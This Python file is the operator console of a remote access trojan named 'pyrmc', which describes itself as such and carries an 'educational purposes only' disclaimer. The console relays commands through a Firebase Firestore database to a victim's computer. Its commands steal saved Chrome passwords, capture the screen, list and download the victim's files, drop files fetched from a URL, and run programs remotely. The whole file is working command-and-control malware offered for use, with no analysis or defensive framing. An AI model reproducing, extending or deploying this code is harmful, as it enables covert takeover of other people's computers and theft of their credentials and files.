import json
import firebase_admin
from firebase_admin import credentials, firestore
import colorama
from colorama import Fore
import art
from art import *
import time
import os

def spacebreak():
    print('')

# Initialize Firebase Admin SDK
cred = credentials.Certificate("storage/cred.json")
firebase_admin.initialize_app(cred)
db = firestore.client()

logo = text2art('/ pyrmc')
print(Fore.LIGHTMAGENTA_EX + logo)
print(Fore.LIGHTBLACK_EX + '--------------' + Fore.LIGHTMAGENTA_EX + ' type help for command list ' + Fore.LIGHTBLACK_EX + '-------')
spacebreak()
time.sleep(1)
print(Fore.MAGENTA + 'pyrmc is a remote access trojan tool built using firebase and python \nthis tool was made for educational purposes only \nplease refrain from using pyrmc for malicious purposes \nthe writer of this script is not responsible for what you use it for.')
time.sleep(2)


def write_to_firestore(collection_name, data):
    doc_ref = db.collection(collection_name).document()
    doc_ref.set(data)


def listen_to_output():
    start_time = time.time()
    while True:
        output_ref = db.collection("output")
        docs = output_ref.stream()

        for doc in docs:
            # Check if the document was created within the last 3 seconds
            current_time = time.time()
            doc_time = doc.create_time.timestamp()
            if current_time - doc_time <= 3:
                output_data = doc.to_dict()
                # output recieved text can get put here... (print(recieved)) if ykyk i dont want it tho
                print(Fore.LIGHTBLACK_EX + "output >> " + Fore.LIGHTMAGENTA_EX + output_data["output"]) #prints output
                return True
        # If no recent output found, wait for 1 second before checking again
        if time.time() - start_time > 11:
            return False
        time.sleep(1)


def edit_txtfile():
    path = input(Fore.GREEN + "edit.txtfile(path=?) >> " + Fore.YELLOW)
    txt = input(Fore.GREEN + "edit.txtfile(path,txt=?) >> " + Fore.YELLOW)
    data = {
        "command": "edit.txtfile",
        "path": path,
        "txt": txt
    }
    write_to_firestore("commands", data)
    spacebreak()
    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
    if not listen_to_output():
        print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")


def get_pcinfo():
    data = {
        "command": "!pcinfo"
    }
    write_to_firestore("commands", data)
    spacebreak()
    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
    if not listen_to_output():
        print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")


def get_chrome_passwords():
    data = {
        "command": "!chromepasswords"
    }
    write_to_firestore("commands", data)
    spacebreak()
    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
    if not listen_to_output():
        print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")


def import_file_to_dir():
    file_link = input(Fore.LIGHTBLACK_EX + "import file, file has to be hosted on url >> " + Fore.LIGHTMAGENTA_EX)
    directory = input(Fore.LIGHTBLACK_EX+ "directory to import file to >> " + Fore.LIGHTMAGENTA_EX)
    data = {
        "command": "!import",
        "file_link": file_link,
        "directory": directory
    }
    write_to_firestore("commands", data)
    spacebreak()
    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
    if not listen_to_output():
        print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")


def play_sound():
    sound_dir = input(Fore.LIGHTBLACK_EX + "path to the sound file, has to be on users system >> " + Fore.LIGHTMAGENTA_EX)
    data = {
        "command": "!playsound",
        "sounddir": sound_dir
    }
    write_to_firestore("commands", data)
    spacebreak()
    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
    if not listen_to_output():
        print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")


def view_screen():
    data = {
        "command": "!viewscreen"
    }
    write_to_firestore("commands", data)
    spacebreak()
    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
    if not listen_to_output():
        print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")

def ls_storage():
    data = {
        "command": "!ls.storage"
    }
    write_to_firestore("commands", data)
    spacebreak()
    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
    if not listen_to_output():
        print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")

def ls_command():
    directory = input(Fore.LIGHTBLACK_EX + "list files in which directory >> " + Fore.LIGHTMAGENTA_EX)
    data = {
        "command": "!ls",
        "lsdirectory": directory
    }
    write_to_firestore("commands", data)
    spacebreak()
    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
    if not listen_to_output():
        print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")


def export_file_or_folder():
    export_path = input(Fore.LIGHTBLACK_EX + "download path >> " + Fore.LIGHTMAGENTA_EX)
    data = {
        "command": "!download",
        "exportpath": export_path
    }
    write_to_firestore("commands", data)
    spacebreak()
    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
    if not listen_to_output():
        print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")

def display_image():
    img_path = input(Fore.LIGHTBLACK_EX + "path to image >> " + Fore.LIGHTMAGENTA_EX)
    data = {
        "command": "!displayimage",
        "imgpath": img_path
    }
    write_to_firestore("commands", data)
    spacebreak()
    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
    if not listen_to_output():
        print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")

def display_video():
    vid_path = input(Fore.LIGHTBLACK_EX + "path to video >> " + Fore.LIGHTMAGENTA_EX)
    data = {
        "command": "!displayvideo",
        "vidpath": vid_path
    }
    write_to_firestore("commands", data)
    spacebreak()
    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
    if not listen_to_output():
        print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")

def get_processes():
    data = {
        "command": "!processes"
    }
    write_to_firestore("commands", data)
    spacebreak()
    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
    if not listen_to_output():
        print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")

def run_task():
    task_path = input(Fore.LIGHTBLACK_EX + "path of task to run >> " + Fore.LIGHTMAGENTA_EX)
    data = {
        "command": "!run",
        "runpath": task_path
    }
    write_to_firestore("commands", data)
    spacebreak()
    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
    if not listen_to_output():
        print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")

def main():
    while True:
        spacebreak()
        command = input(Fore.LIGHTBLACK_EX + "command >> " + Fore.LIGHTMAGENTA_EX)
        if command.startswith("edit.txtfile"):
            edit_txtfile()
        elif command.strip() == "!pcinfo":
            get_pcinfo()
        elif command.strip() == "!chromepasswords":
            get_chrome_passwords()
        elif command.strip() == "!processes":
            get_processes()
        elif command.startswith("!import"):
            import_file_to_dir()
        elif command.startswith("!download"):
            export_file_or_folder()
        elif command.startswith("!playsound"):
            play_sound()
        elif command.strip() == "!viewscreen":
            view_screen()
        elif command.strip() == "!displayimage":
            display_image()
        elif command.strip() == "!displayvideo":
            display_video()
        elif command.startswith("!run"):
            run_task()
        elif command.strip() == "!ls":
            ls_command()
        elif command.strip() == "!ls.storage":
            ls_storage()
        else:
            spacebreak()
            print(Fore.LIGHTBLACK_EX + "error >> command not recognized")



if __name__ == "__main__":
    main()
